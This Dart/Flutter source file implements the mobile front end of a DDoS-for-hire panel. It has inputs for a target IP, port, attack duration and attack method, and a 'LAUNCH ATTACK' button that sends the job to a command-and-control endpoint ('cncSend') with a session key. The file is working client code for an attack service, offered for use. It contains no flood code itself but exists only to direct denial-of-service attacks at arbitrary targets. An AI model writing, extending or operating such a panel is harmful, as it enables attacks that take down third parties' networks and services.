// ddos_panel.dart
// ═══════════════════════════════════════════════════════════════════════════
// DDoS ATTACK PANEL — GLASSMORPHISM EDITION
// ═══════════════════════════════════════════════════════════════════════════
import 'app_config.dart';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';
import 'glass_theme.dart';

class AttackPanel extends StatefulWidget {
  final String sessionKey;
  final List<Map<String, dynamic>> listDoos;

  const AttackPanel({
    super.key,
    required this.sessionKey,
    required this.listDoos,
  });

  @override
  State<AttackPanel> createState() => _AttackPanelState();
}

class _AttackPanelState extends State<AttackPanel>
    with TickerProviderStateMixin {
  final targetController = TextEditingController();
  final portController = TextEditingController();
  String selectedDoosId = "";
  double attackDuration = 60;
  bool _isSending = false;

  @override
  void initState() {
    super.initState();
    if (widget.listDoos.isNotEmpty) {
      selectedDoosId = widget.listDoos[0]['ddos_id'];
    }
  }

  Future<void> _sendDoos() async {
    final target = targetController.text.trim();
    final port = portController.text.trim();
    final key = widget.sessionKey;
    final int duration = attackDuration.toInt();

    if (target.isEmpty || key.isEmpty) {
      _showAlert("Invalid Input", "Target IP cannot be empty.");
      return;
    }

    if (selectedDoosId != "icmp" &&
        (port.isEmpty || int.tryParse(port) == null)) {
      _showAlert("Invalid Port", "Please input a valid port.");
      return;
    }

    setState(() => _isSending = true);

    try {
      final uri = Uri.parse(
          "$kBaseUrl/cncSend?key=$key&target=$target&ddos=$selectedDoosId&port=${port.isEmpty ? 0 : port}&duration=$duration");
      final res = await http.get(uri);
      final data = jsonDecode(res.body);

      if (data["cooldown"] == true) {
        _showAlert("Cooldown", "Please wait a moment before sending again.");
      } else if (data["valid"] == false) {
        _showAlert("Invalid Key", "Your session key is invalid.");
      } else if (data["sended"] == false) {
        _showAlert("Failed", "Failed to send attack.");
      } else {
        _showAlert("Success", "Attack has been successfully sent to $target.");
      }
    } catch (_) {
      _showAlert("Error", "An unexpected error occurred.");
    }
    setState(() => _isSending = false);
  }

  void _showAlert(String title, String msg) {
    GlassDialog.show(
      context,
      title: title,
      message: msg,
      icon: Icons.bolt_rounded,
      accentColor: GlassPalette.red,
    );
  }

  @override
  Widget build(BuildContext context) {
    final isIcmp = selectedDoosId.toLowerCase() == "icmp";

    return Scaffold(
      backgroundColor: GlassPalette.bg,
      extendBodyBehindAppBar: true,
      body: GlassBg(
        child: SafeArea(
          child: Column(
            children: [
              _buildHeader(),
              Expanded(
                child: SingleChildScrollView(
                  padding: const EdgeInsets.all(16),
                  child: Column(
                    children: [
                      // ═══ ICON ═══
                      Container(
                        padding: const EdgeInsets.all(18),
                        decoration: BoxDecoration(
                          color: GlassPalette.red.withOpacity(0.25),
                          borderRadius: BorderRadius.circular(20),
                          border: Border.all(
                            color: GlassPalette.red.withOpacity(0.7),
                            width: 1.5,
                          ),
                          boxShadow: [
                            BoxShadow(
                              color: GlassPalette.red.withOpacity(0.5),
                              blurRadius: 20,
                            ),
                          ],
                        ),
                        child: const Icon(Icons.rocket_launch_rounded,
                            color: GlassPalette.white, size: 44),
                      ),
                      const SizedBox(height: 22),

                      // TARGET INPUT
                      GlassCard(
                        borderWidth: 1.5,
                        radius: 20,
                        padding: const EdgeInsets.all(16),
                        child: Column(
                          crossAxisAlignment: CrossAxisAlignment.start,
                          children: [
                            GlassSectionTitle(
                              icon: Icons.computer,
                              title: 'Target Input',
                              color: GlassPalette.red,
                            ),
                            const SizedBox(height: 14),
                            GlassInput(
                              controller: targetController,
                              hint: "Target IP (e.g. 1.1.1.1)",
                              icon: Icons.computer,
                            ),
                          ],
                        ),
                      ),
                      const SizedBox(height: 16),

                      // PORT
                      GlassCard(
                        borderWidth: 1.5,
                        radius: 20,
                        padding: const EdgeInsets.all(16),
                        child: Column(
                          crossAxisAlignment: CrossAxisAlignment.start,
                          children: [
                            GlassSectionTitle(
                              icon: Icons.wifi_tethering,
                              title: 'Port Configuration',
                              color: GlassPalette.orange,
                            ),
                            const SizedBox(height: 14),
                            GlassInput(
                              controller: portController,
                              hint: isIcmp
                                  ? "ICMP does not use port"
                                  : "Port (e.g. 80)",
                              icon: Icons.wifi_tethering,
                              keyboardType: TextInputType.number,
                            ),
                          ],
                        ),
                      ),
                      const SizedBox(height: 16),

                      // DURATION
                      GlassCard(
                        borderWidth: 1.5,
                        radius: 20,
                        padding: const EdgeInsets.all(16),
                        child: Column(
                          crossAxisAlignment: CrossAxisAlignment.start,
                          children: [
                            GlassSectionTitle(
                              icon: Icons.timer,
                              title: 'Attack Duration',
                              color: GlassPalette.blue,
                            ),
                            const SizedBox(height: 14),
                            Text(
                              "${attackDuration.toInt()} seconds",
                              style: GlassFont.pixel(
                                size: 10,
                                weight: FontWeight.w700,
                                color: GlassPalette.text,
                              ),
                            ),
                            const SizedBox(height: 12),
                            SliderTheme(
                              data: SliderTheme.of(context).copyWith(
                                activeTrackColor: GlassPalette.blue,
                                inactiveTrackColor:
                                    Colors.white.withOpacity(0.15),
                                thumbColor: GlassPalette.white,
                                overlayColor:
                                    GlassPalette.blue.withOpacity(0.2),
                              ),
                              child: Slider(
                                value: attackDuration,
                                min: 10,
                                max: 300,
                                divisions: 29,
                                label: "${attackDuration.toInt()}s",
                                onChanged: (value) {
                                  setState(() => attackDuration = value);
                                },
                              ),
                            ),
                          ],
                        ),
                      ),
                      const SizedBox(height: 16),

                      // METHOD
                      GlassCard(
                        borderWidth: 1.5,
                        radius: 20,
                        padding: const EdgeInsets.all(16),
                        child: Column(
                          crossAxisAlignment: CrossAxisAlignment.start,
                          children: [
                            GlassSectionTitle(
                              icon: Icons.flash_on,
                              title: 'Attack Method',
                              color: GlassPalette.red,
                            ),
                            const SizedBox(height: 14),
                            Container(
                              padding: const EdgeInsets.symmetric(
                                  horizontal: 12),
                              decoration: BoxDecoration(
                                color: Colors.white.withOpacity(0.08),
                                borderRadius: BorderRadius.circular(14),
                                border: Border.all(
                                  color: Colors.white.withOpacity(0.2),
                                  width: 1.2,
                                ),
                              ),
                              child: DropdownButtonHideUnderline(
                                child: DropdownButton<String>(
                                  dropdownColor:
                                      GlassPalette.bg.withOpacity(0.98),
                                  value: selectedDoosId,
                                  isExpanded: true,
                                  iconEnabledColor: GlassPalette.white,
                                  style: GlassFont.body(
                                    size: 13,
                                    weight: FontWeight.w700,
                                    color: GlassPalette.text,
                                  ),
                                  items: widget.listDoos.map((doos) {
                                    return DropdownMenuItem<String>(
                                      value: doos['ddos_id'],
                                      child: Padding(
                                        padding: const EdgeInsets.symmetric(
                                            vertical: 8),
                                        child: Text(
                                          doos['ddos_name'],
                                          style: GlassFont.body(
                                            size: 13,
                                            weight: FontWeight.w700,
                                            color: GlassPalette.text,
                                          ),
                                        ),
                                      ),
                                    );
                                  }).toList(),
                                  onChanged: (value) {
                                    setState(() => selectedDoosId = value!);
                                  },
                                ),
                              ),
                            ),
                          ],
                        ),
                      ),

                      const SizedBox(height: 24),

                      // LAUNCH BUTTON
                      GlassButton(
                        text: _isSending ? 'SENDING...' : 'LAUNCH ATTACK',
                        icon: _isSending ? null : Icons.bolt_rounded,
                        isLoading: _isSending,
                        onTap: _isSending ? null : _sendDoos,
                        bgColor: GlassPalette.red,
                        textColor: GlassPalette.white,
                        padding: const EdgeInsets.symmetric(vertical: 18),
                        fontSize: 12,
                      ),

                      const SizedBox(height: 20),
                    ],
                  ),
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  Widget _buildHeader() {
    return Container(
      padding: const EdgeInsets.fromLTRB(16, 10, 16, 10),
      child: Row(
        children: [
          GestureDetector(
            onTap: () => Navigator.pop(context),
            child: Container(
              padding: const EdgeInsets.all(10),
              decoration: BoxDecoration(
                color: Colors.white.withOpacity(0.1),
                borderRadius: BorderRadius.circular(12),
                border: Border.all(
                  color: Colors.white.withOpacity(0.25),
                  width: 1.2,
                ),
              ),
              child: const Icon(Icons.arrow_back_rounded,
                  color: GlassPalette.white, size: 20),
            ),
          ),
          const SizedBox(width: 12),
          Text(
            'ATTACK PANEL',
            style: GlassFont.pixel(
              size: 11,
              weight: FontWeight.w700,
              color: GlassPalette.text,
              letterSpacing: 1.5,
            ),
          ),
        ],
      ),
    );
  }

  @override
  void dispose() {
    targetController.dispose();
    portController.dispose();
    super.dispose();
  }
}